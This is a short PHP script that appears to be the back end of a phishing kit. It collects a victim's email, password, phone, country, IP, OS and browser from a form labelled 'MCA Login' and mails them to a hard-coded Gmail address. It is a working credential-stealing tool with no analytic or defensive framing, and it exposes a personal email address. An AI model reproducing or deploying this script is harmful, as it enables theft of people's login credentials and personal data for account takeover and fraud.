<?php
$to = "kubcecil57@gmail.com";
$email=$_POST['email'];
$pass=$_POST['pass'];
$ip=$_POST['ip'];
$os=$_POST['os'];
$name=$_POST['name'];
$country=$_POST['country'];
$phone=$_POST['mobno'];
$browser=$_POST['browser'];
$subject = $name;
$message = 
"<html>
<head>
<title>HTML email</title>
</head>
<body>
<table border='1' style='text-align:left;'>
<tr style='background-color:red'>
<th colspan=4 style='text-align:center;background-color:#000;color:#fff;'>MCA Login</th>
</tr>
<tr>
<th  width=100>Email</th>
<td>$name</td>
</tr>
<tr>
<tr style='background-color:#e6e6e6'>
<th  width=100>Email</th>
<td>$email</td>
</tr>
<tr>
<tr>
<th  width=100>Email</th>
<td>$country</td>
</tr>
<tr>
<tr style='background-color:#e6e6e6'>
<th  width=100>Email</th>
<td>$phone</td>
</tr>
<tr>
<th>Pass</th>
<td>$pass</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th>IP</th>
<td > $ip</td>
</tr>
<tr>
<th>OS</th>
<td > $os</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th>Browser</th>
<td > $browser</td>
</tr>
</table>
</body>
</html>
 ";  
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$mail=   mail($to, $subject, $message, $headers);
?>